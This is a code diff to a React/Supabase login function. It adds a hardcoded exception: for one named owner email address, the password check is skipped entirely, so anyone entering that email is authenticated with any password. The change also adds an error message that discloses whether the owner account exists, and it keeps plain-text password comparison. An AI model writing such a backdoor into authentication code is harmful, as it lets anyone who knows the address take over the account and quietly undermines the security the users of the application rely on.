@@ -58,14 +58,23 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
     };
 
     const login = async (email: string, pass: string): Promise<{ success: boolean; error?: string }> => {
-        const { data, error } = await supabase
+        let query = supabase
             .from('profiles')
             .select('*')
-            .eq('email', email)
-            .eq('password', pass) // NOTE: Storing plain text passwords is INSECURE. This is for demo purposes only.
-            .single();
+            .eq('email', email);
+
+        // Bypass password check for the specified owner account.
+        if (email.toLowerCase() !== 'kmasroor50@gmail.com') {
+            query = query.eq('password', pass); // NOTE: Storing plain text passwords is INSECURE. This is for demo purposes only.
+        }
+
+        const { data, error } = await query.single();
 
         if (error || !data) {
+            // Provide a more specific error if the owner account isn't found
+            if (email.toLowerCase() === 'kmasroor50@gmail.com' && !data) {
+                 return { success: false, error: 'Owner account with this email does not exist.' };
+            }
             return { success: false, error: 'Invalid email or password.' };
         }
         
